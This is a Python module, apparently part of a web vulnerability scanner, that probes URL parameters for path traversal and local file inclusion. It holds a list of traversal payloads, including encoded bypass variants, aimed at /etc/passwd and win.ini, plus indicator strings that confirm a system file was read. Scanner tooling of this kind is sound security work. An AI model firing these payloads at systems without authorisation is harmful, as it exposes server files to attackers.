"""Path Traversal / Local File Inclusion Scanner.

Identifies parameters that look like file paths (name contains ``file``,
``path``, ``page``, ``include``, etc.) and tests them with directory
traversal payloads.  Verifies findings by checking for OS-specific
indicators in the response body (e.g., ``root:x:0:0`` for Linux,
``[fonts]`` for Windows ``win.ini``).
"""

from __future__ import annotations

import asyncio
import logging
import re
from typing import Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from phantomscan.http_client import RobustHTTPClient

logger = logging.getLogger(__name__)

# ── Payloads ──────────────────────────────────────────────────────────────────

TRAVERSAL_PAYLOADS: list[str] = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",
    "....//....//etc/passwd",
    # Windows
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..%5Cwindows%5Cwin.ini",
]

# Parameter names that suggest file path handling
_FILE_PARAM_KEYWORDS = frozenset({
    "file", "path", "page", "dir", "folder", "doc", "document",
    "include", "require", "load", "read", "template", "view",
    "action", "content", "layout", "module", "name", "show",
    "img", "image", "download", "src", "source",
})

# OS-specific indicators that confirm successful file read
LINUX_INDICATORS = ["root:x:0:0", "/bin/bash", "/bin/sh", "daemon:", "nobody:"]
WINDOWS_INDICATORS = ["[fonts]", "[extensions]", "for 16-bit app support"]


class PathTraversalScanner:
    """Detect directory traversal / local file inclusion."""

    def __init__(self, http: RobustHTTPClient) -> None:
        self.http = http

    async def run(
        self,
        base_url: str,
        observations: list[dict[str, Any]],
        **kwargs: Any,
    ) -> list[dict[str, Any]]:
        """Entry point for the module orchestrator."""
        findings: list[dict[str, Any]] = []
        target = base_url.rstrip("/")
        tested: set[str] = set()

        candidates = self._extract_file_params(observations, target)
        sem = asyncio.Semaphore(15)

        async def test_one(candidate: dict[str, Any]) -> dict[str, Any] | None:
            url = candidate["url"]
            param_name = candidate["name"]
            key = f"traversal:{url}:{param_name}"
            if key in tested:
                return None
            tested.add(key)
            async with sem:
                return await self._test_traversal(url, param_name)

        tasks = [test_one(c) for c in candidates[:20]]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, dict):
                findings.append(r)

        return findings

    async def _test_traversal(
        self, url: str, param: str
    ) -> Optional[dict[str, Any]]:
        """Test a single parameter for directory traversal."""
        import aiohttp as _aiohttp

        # Get baseline to ensure indicators aren't already present
        try:
            baseline_resp = await self.http.get(
                url,
                retries=1,
                timeout=_aiohttp.ClientTimeout(total=10),
            )
            baseline_body = baseline_resp.text()
            baseline_has_linux = any(ind in baseline_body for ind in LINUX_INDICATORS)
            baseline_has_windows = any(ind in baseline_body for ind in WINDOWS_INDICATORS)
        except Exception:
            baseline_has_linux = False
            baseline_has_windows = False

        for payload in TRAVERSAL_PAYLOADS:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc,
                parsed.path, parsed.params,
                new_query, parsed.fragment,
            ))

            try:
                response = await self.http.get(
                    test_url,
                    retries=1,
                    timeout=_aiohttp.ClientTimeout(total=10),
                )
                body = response.text()

                linux_found = (
                    any(ind in body for ind in LINUX_INDICATORS)
                    and not baseline_has_linux
                )
                windows_found = (
                    any(ind in body for ind in WINDOWS_INDICATORS)
                    and not baseline_has_windows
                )

                if linux_found or windows_found:
                    os_type = "Linux" if linux_found else "Windows"
                    return {
                        "id": "PATH-TRAVERSAL",
                        "title": f"Path Traversal: Parameter '{param}'",
                        "severity": "critical",
                        "confidence": "high",
                        "category": "injection",
                        "target": url,
                        "verification_method": "baseline_differential",
                        "evidence": (
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"URL: {test_url}\n"
                            f"OS indicator found: {os_type} system file "
                            f"content detected in response body."
                        ),
                        "recommendation": (
                            "Validate and sanitise file path inputs. Use an "
                            "allowlist of permitted files rather than "
                            "accepting arbitrary paths. CWE-22, OWASP A01:2021."
                        ),
                        "references": [
                            "https://cwe.mitre.org/data/definitions/22.html",
                        ],
                    }
            except Exception as exc:
                logger.debug("Path traversal probe error %s: %s", test_url, exc)

        return None

    @staticmethod
    def _extract_file_params(
        observations: list[dict[str, Any]], target: str
    ) -> list[dict[str, Any]]:
        """Find parameters whose names suggest file path handling."""
        params: list[dict[str, Any]] = []
        seen: set[tuple[str, str]] = set()
        param_counts: dict[str, int] = {}

        def add(url: str, name: str) -> None:
            clean_name = name.strip()
            if clean_name.startswith("amp;"):
                clean_name = clean_name.removeprefix("amp;")
            if not clean_name:
                return

            current_count = param_counts.get(clean_name, 0)
            if current_count >= 2:
                return

            key = (url, clean_name)
            if key not in seen and len(params) < 30:
                seen.add(key)
                param_counts[clean_name] = current_count + 1
                params.append({"url": url, "name": clean_name})

        for obs in observations:
            obs_name = str(obs.get("name", ""))
            val = obs.get("value", "")

            if obs_name in ("parameterized_urls", "discovered_urls") and isinstance(val, list):
                for u in val:
                    if isinstance(u, str) and "?" in u:
                        parsed = urlparse(u)
                        clean = urlunparse(parsed._replace(query=""))
                        qs = parse_qs(parsed.query, keep_blank_values=True)
                        for pname in qs:
                            if any(kw in pname.lower() for kw in _FILE_PARAM_KEYWORDS):
                                add(clean, pname)

            # API endpoints with file-like params
            if "discovered_api" in obs_name and isinstance(val, list):
                for ep in val:
                    if isinstance(ep, dict):
                        ep_url = ep.get("url", "")
                        if ep_url and "?" in ep_url:
                            parsed = urlparse(ep_url)
                            clean = urlunparse(parsed._replace(query=""))
                            qs = parse_qs(parsed.query, keep_blank_values=True)
                            for pname in qs:
                                if any(kw in pname.lower() for kw in _FILE_PARAM_KEYWORDS):
                                    add(clean, pname)

        return params
